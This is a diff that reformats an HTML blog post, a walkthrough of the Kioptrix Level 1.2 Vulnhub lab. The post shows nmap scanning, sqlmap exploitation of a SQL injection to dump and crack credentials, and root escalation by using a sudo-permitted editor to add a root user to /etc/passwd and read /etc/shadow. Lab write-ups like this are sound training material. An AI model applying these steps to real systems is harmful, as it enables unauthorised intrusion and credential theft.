@@ -1,6 +1,66 @@
-<!doctype html><html lang=en-us><head><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script><meta charset=utf-8><title>KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1"><meta name=author content="Nasef"><meta name=generator content="Hugo 0.85.0"><link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css><link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css><link href=https://iamnasef.com/scss/style.min.css rel=stylesheet><link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon><link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon></head><body><nav class="navbar navbar-expand-lg site-navigation"><div class=container><a class=navbar-brand href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo.png alt=logo></a>
+<!doctype html><html lang=en-us><head>
+<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-194024736-1','auto'),ga('send','pageview'))</script>
+<meta charset=utf-8>
+<title>KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough</title>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1">
+<meta name=author content="Nasef">
+<meta name=generator content="Hugo 0.86.0">
+<link rel=stylesheet href=https://iamnasef.com/css/bootstrap.min.css>
+<link rel=stylesheet href=https://iamnasef.com/font-awesome/css/font-awesome.min.css>
+<link href=https://iamnasef.com/scss/style.min.css rel=stylesheet>
+<link rel="shortcut icon" href=https://iamnasef.com/images/favicon.png type=image/x-icon>
+<link rel=icon href=https://iamnasef.com/images/favicon.ico type=image/x-icon>
+</head><body><nav class="navbar navbar-expand-lg site-navigation">
+<div class=container>
+<a class=navbar-brand href=https://iamnasef.com/>
+<img src=https://iamnasef.com/images/logo.png alt=logo>
+</a>
 <button class="navbar-toggler collapsed" type=button data-toggle=collapse data-target=#sitenavbar>
-<span class=icon-bar></span><span class=icon-bar></span><span class=icon-bar></span></button><div class="collapse navbar-collapse" id=sitenavbar><ul class="navbar-nav ml-auto main-nav"><li class=nav-item><a class=nav-link href=https://iamnasef.com/>Home</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/projects>Projects</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/courses>Courses</a></li><li class=nav-item><a class=nav-link href=https://iamnasef.com/blog>Blog</a></li><li class=nav-item><a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact><span class=btn-area><span data-text="Contact Me">Contact Me</span></span></a></li></ul></div></div></nav><main><section class="site-blog details"><div class=container><div class="row justify-content-center"><div class=col-lg-8><article class=site-blog-details><p><span>September 27, 2020</span> by <span>Nasef</span></p><h2 class=blog-title>KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough</h2><img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image><p>KIOPTRIX: LEVEL 1.2 is a machine in which I used SQL Injection to get useres credintials to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p><h2 id=scanning>Scanning</h2><p>As always, I started scanning with Nmap</p><pre><code>root@kali:/home/kali# nmap -sV -sC -p- 192.168.198.143
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+<span class=icon-bar></span>
+</button>
+<div class="collapse navbar-collapse" id=sitenavbar>
+<ul class="navbar-nav ml-auto main-nav">
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/>Home</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/projects>Projects</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/courses>Courses</a>
+</li>
+<li class=nav-item>
+<a class=nav-link href=https://iamnasef.com/blog>Blog</a>
+</li>
+<li class=nav-item>
+<a class="nav-link btn btn-sm btn-primary btn-sm-rounded" href=https://iamnasef.com/contact>
+<span class=btn-area>
+<span data-text="Contact Me">
+Contact Me
+</span>
+</span>
+</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<main>
+<section class="site-blog details">
+<div class=container>
+<div class="row justify-content-center">
+<div class=col-lg-8>
+<article class=site-blog-details>
+<p><span>September 27, 2020</span> by <span>Nasef</span></p>
+<h2 class=blog-title>KIOPTRIX: LEVEL 1.2 Vulnhub Walkthrough</h2>
+<img class=feature-image src=https://iamnasef.com/images/blog/featured-image-vulnhub.png alt=blog-feature-image>
+<p>KIOPTRIX: LEVEL 1.2 is a machine in which I used SQL Injection to get useres credintials to obtain shell access and then exploited the misconfigured sudo permissions to get root Access.</p>
+<h2 id=scanning>Scanning</h2>
+<p>As always, I started scanning with Nmap</p>
+<pre><code>root@kali:/home/kali# nmap -sV -sC -p- 192.168.198.143
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-27 21:03 EDT
 Nmap scan report for kioptrix3.com (192.168.198.143)
 Host is up (0.0030s latency).
@@ -23,16 +83,35 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.90 seconds
 
-</code></pre><p>A Normal HTTP and SSH Services</p><h2 id=http-services>HTTP Services</h2><p>So First I tried to browse the website and found a suspicous URL. And Adding the single quotation giving me a MySQL error so it&rsquo;s vulnerable to SQL Injection.</p><pre><code>http://192.168.198.143/gallery/gallery.php?id=1&amp;sort=photoid#photos
-</code></pre><h2 id=sql-injection>SQL Injection</h2><p>So Imeditatly I ran SQLMAP to exploit, dump database and evnatioly crack the hashes found in the database.</p><pre><code>sqlmap -u 192.168.198.143/gallery/gallery.php?id=1 --dump
-</code></pre><p><img src=/images/blog/006/1.png alt=Username></p><p>Then I ssh&rsquo;d to user loneferret.</p><h2 id=privilege-escalation>Privilege Escalation</h2><p>I ran diffreent Enumeration scripts and found an intersting sudo privileges.</p><pre><code>loneferret@Kioptrix3:~$ sudo -l
+</code></pre><p>A Normal HTTP and SSH Services</p>
+<h2 id=http-services>HTTP Services</h2>
+<p>So First I tried to browse the website and found a suspicous URL. And Adding the single quotation giving me a MySQL error so it&rsquo;s vulnerable to SQL Injection.</p>
+<pre><code>http://192.168.198.143/gallery/gallery.php?id=1&amp;sort=photoid#photos
+</code></pre><h2 id=sql-injection>SQL Injection</h2>
+<p>So Imeditatly I ran SQLMAP to exploit, dump database and evnatioly crack the hashes found in the database.</p>
+<pre><code>sqlmap -u 192.168.198.143/gallery/gallery.php?id=1 --dump
+</code></pre><p><img src=/images/blog/006/1.png alt=Username></p>
+<p>Then I ssh&rsquo;d to user loneferret.</p>
+<h2 id=privilege-escalation>Privilege Escalation</h2>
+<p>I ran diffreent Enumeration scripts and found an intersting sudo privileges.</p>
+<pre><code>loneferret@Kioptrix3:~$ sudo -l
 User loneferret may run the following commands on this host:
     (root) NOPASSWD: !/usr/bin/su
     (root) NOPASSWD: /usr/local/bin/ht
-</code></pre><p>The su binary path is wrong and it has ! mark. The ht binary is a text and hex editor so I had many ideas in this case.</p><ol><li>Read /etc/shadow and get root hash then crack it with john (SUCCESS)</li><li>Write in /etc/passwd a new user with root privliges (SUCCESS)</li><li>Write in /etc/sudoers and change the su binary path (SUCCESS)</li></ol><p>But first I had to fix some errors</p><pre><code>loneferret@Kioptrix3:~$ sudo ht
+</code></pre><p>The su binary path is wrong and it has ! mark. The ht binary is a text and hex editor so I had many ideas in this case.</p>
+<ol>
+<li>Read /etc/shadow and get root hash then crack it with john (SUCCESS)</li>
+<li>Write in /etc/passwd a new user with root privliges (SUCCESS)</li>
+<li>Write in /etc/sudoers and change the su binary path (SUCCESS)</li>
+</ol>
+<p>But first I had to fix some errors</p>
+<pre><code>loneferret@Kioptrix3:~$ sudo ht
 Error opening terminal: xterm-256color.
 loneferret@Kioptrix3:~$ export TERM=xterm
-</code></pre><p>Then i opened /etc/passwd and added yoyo -root- user.</p><p><img src=/images/blog/006/2.png alt=Username></p><p>Then I logged in using ssh to the created user.</p><pre><code>kali@kali:~$ ssh yoyo@192.168.198.143
+</code></pre><p>Then i opened /etc/passwd and added yoyo -root- user.</p>
+<p><img src=/images/blog/006/2.png alt=Username></p>
+<p>Then I logged in using ssh to the created user.</p>
+<pre><code>kali@kali:~$ ssh yoyo@192.168.198.143
 yoyo@192.168.198.143's password: 
 Last login: Mon Apr 18 11:29:13 2011
 Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686
@@ -87,7 +166,86 @@ http://www.exploit-db.com/exploits/17083/
 Also, all pictures were taken from Google Images, so being part of the
 public domain I used them.
 
-</code></pre><p>and voila here is the root privilege!</p></article></div></div></div></section><section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)><div class=container><div class=row><div class="col-12 text-center"><h1 class=site-cta-title>SAY HELLO</h1><a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a><div class=sm-links><a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
+</code></pre><p>and voila here is the root privilege!</p>
+</article>
+</div>
+</div>
+</div>
+</section>
+<section class=site-cta id=contact style=background-image:url(https://iamnasef.com/images/backgrounds/cta-background.jpg)>
+<div class=container>
+<div class=row>
+<div class="col-12 text-center">
+<h1 class=site-cta-title>SAY HELLO</h1>
+<a class=mail-link href=mailto:hello@iamnasef.com><h2 class=mail>HELLO@IAMNASEF.COM</h2></a>
+<div class=sm-links>
+<a href=https://twitter.com/iamnasef><i class="fa fa-twitter-square" aria-hidden=true></i></a>
 <a href=https://www.linkedin.com/in/iamnasef/><i class="fa fa-linkedin-square" aria-hidden=true></i></a>
 <a href=https://github.com/iamnasef><i class="fa fa-github-square" aria-hidden=true></i></a>
-<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a></div></div></div></div></section></main><footer class=site-footer><div class=container><div class=row><div class=col-12><div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div></div><div class="col-lg-3 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Contact Info</h5><p class=site-footer-widget-description><a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a></p></div></div><div class="col-lg-2 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Check it</h5><ul class=site-footer-widget-links><li><a href=https://iamnasef.com/blog>Blog</a></li><li><a href=https://iamnasef.com/projects>Projects</a></li><li><a href=https://iamnasef.com/courses>Courses</a></li><li><a href=https://iamnasef.com/contact>Contact</a></li></ul></div></div><div class="col-lg-2 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Social Media</h5><ul class=site-footer-widget-links><li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li><li><a href=https://twitter.com/iamnasef>Twitter</a></li><li><a href=https://github.com/iamnasef>Github</a></li><li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li></ul></div></div><div class="col-lg-3 col-md-6"><div class=site-footer-widget><h5 class=site-footer-widget-title>Keeping you safe</h5><p class=site-footer-widget-description>Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness</p></div></div><div class="col-lg-2 col-12"><a href=#top class=site-footer-widget-top><img src=https://iamnasef.com/images/to-top.svg alt=back-to-top><p>I want to<br>visit again</p></a></div></div></div></footer><script src=https://iamnasef.com/js/formhandler.min.js></script><script src=https://iamnasef.com/js/vendor.min.js></script><script src=https://iamnasef.com/js/script.min.js></script></body></html>
+<a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ><i class="fa fa-youtube-square" aria-hidden=true></i></a>
+</div>
+</div>
+</div>
+</div>
+</section>
+</main><footer class=site-footer>
+<div class=container>
+<div class=row>
+<div class=col-12>
+<div class=site-footer-logo><a href=https://iamnasef.com/><img src=https://iamnasef.com/images/logo-footer.png alt=logo-footer width=100px height=100px></a></div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Contact Info</h5>
+<p class=site-footer-widget-description>
+<a href=mailto:hello@iamnansef.com>hello@iamnansef.com</a>
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Check it</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://iamnasef.com/blog>Blog</a></li>
+<li><a href=https://iamnasef.com/projects>Projects</a></li>
+<li><a href=https://iamnasef.com/courses>Courses</a></li>
+<li><a href=https://iamnasef.com/contact>Contact</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-2 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Social Media</h5>
+<ul class=site-footer-widget-links>
+<li><a href=https://www.linkedin.com/in/iamnasef/>Linkedin</a></li>
+<li><a href=https://twitter.com/iamnasef>Twitter</a></li>
+<li><a href=https://github.com/iamnasef>Github</a></li>
+<li><a href=https://www.youtube.com/channel/UCoxP4Z6Wfz60fFtB31gyNlQ>YouTube</a></li>
+</ul>
+</div>
+</div>
+<div class="col-lg-3 col-md-6">
+<div class=site-footer-widget>
+<h5 class=site-footer-widget-title>Keeping you safe</h5>
+<p class=site-footer-widget-description>
+Application Security Engineering<br>Cyber Security Technical Training<br>Cyber Security Awarness
+</p>
+</div>
+</div>
+<div class="col-lg-2 col-12">
+<a href=#top class=site-footer-widget-top>
+<img src=https://iamnasef.com/images/to-top.svg alt=back-to-top>
+<p>
+I want to
+<br>
+visit again
+</p>
+</a>
+</div>
+</div>
+</div>
+</footer>
+<script src=https://iamnasef.com/js/formhandler.min.js></script>
+<script src=https://iamnasef.com/js/vendor.min.js></script>
+<script src=https://iamnasef.com/js/script.min.js></script></body>
+</html>
